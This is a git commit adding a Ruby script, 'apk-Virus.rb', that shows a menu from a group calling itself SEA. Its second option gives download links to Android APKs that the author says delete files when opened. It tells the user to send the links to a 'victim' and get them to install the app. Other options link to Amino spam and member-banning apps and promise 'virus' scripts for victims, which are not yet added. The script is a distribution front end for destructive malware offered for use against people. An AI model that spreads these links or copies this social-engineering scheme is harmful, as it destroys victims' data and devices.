a66896e64ec377592fe3c381fa72cf5de8118f6c
Jarjanazi <64444222+mrvanonmus@users.noreply.github.com>
2021-01-28 13:56:20 +0200

    Add files via upload

---
+++ apk-Virus.rb
@@ -0,0 +1,27 @@
+
+puts("       _____   _____       ___ \n.     /  ___/ | ____|     /   | \n      | |___  | |__      / /| | \n.     \|___ \ | |  __|    / /_| | \n       ___| | | |___   / /__| |\n      /_____/ |_____| /_/   |_|")
+  puts("[SEA]==========================[SEA]")  
+  puts("       Dev : EBH with Volcano963$C2") 
+  puts("           the bro   hakem$C2")   
+  puts("           the bro   virus$C2")   
+  puts("       amino sploit in SEA $C2") 
+    
+  puts("[SEA]==========================[SEA]") 
+puts("\n\n   {1}tool amino apk")
+puts("\n      {2}vairus apk")
+puts("\n      {3}vairus script")
+puts("\n\n\n       enter the number")
+num=gets.chomp.to_i
+ if num ==1
+   puts "Applications that help you in Amino, you can copy the link and download it automatically\n 1 spam\n Explanation: https://youtu.be/v7Lpf6ObLoc \n Download: https://mega.nz/file/o4JHTQYI#M38jyUhl7WXcpZyUOTIUgCHJtcKOKEh_NccSm8Nqvec \n 2 Agency carrier \n Explanation: https://youtu.be/plZymBfgDoA \n Download: https://mega.nz/file/Y4ZD3KbK#dNR-emW192V0ADJBOi2nhKlwbAkI2jdGGNhSoEPGL1Q \n 3 Banning members\n Explanation: https://youtu.be/Ubbk0y4yyXk\n Download: http://www.mediafire.com/file/x661ouvhfd3ihav/ban_amino.apk/file\n [Note] No application has been modified or cracked. We are not interested in modifying the applications without understanding the way of making and not having enough time to make something like this. I decided to use other people's applications. This does not mean that I steal the application or anything. I just contributed to spreading the application"
+   
+ elsif num ==2
+   puts "Welcome to the apk virus section You can use it as follows: \n1 Copy the download link \n2 Have his victim install an app \n[Note] These applications were made manually by us and they delete files by pressing on them. We are trying to give you the simplest methods, but it takes a long time and I am working on this project alone, so a word of thanks is enough \n[1] Apply amalgam spam\n https://mega.nz/file/014QFabC#y_M5gcx8AKfG7vRCwMEBu6Bopm2jqFoCOWHalBeboUA \n[2] an amalgam transport agency \nhttps://mega.nz/file/g0xyFQyS#Fz9wUpGSyocSAHg0lw76VCzVClAFs4BknwFqNj7sUtY \nJust copy the link and send it to the victim, do not download anything from it to your phone and install it!"
+   
+ elsif num ==3
+   puts "Welcome to the section of viruses in the form of a script \n Here you can copy the commands with a cat and send them to the victim only. This is not difficult \n [note] The script was made by (Yemen Shield) my old team and I do not advise you to run it in order not to usurp your phone \n the commands \n ( Sorry, the section is not added now there) "
+   
+ else
+   puts "fack you and fack the number"
+ end
+ puts "good by"
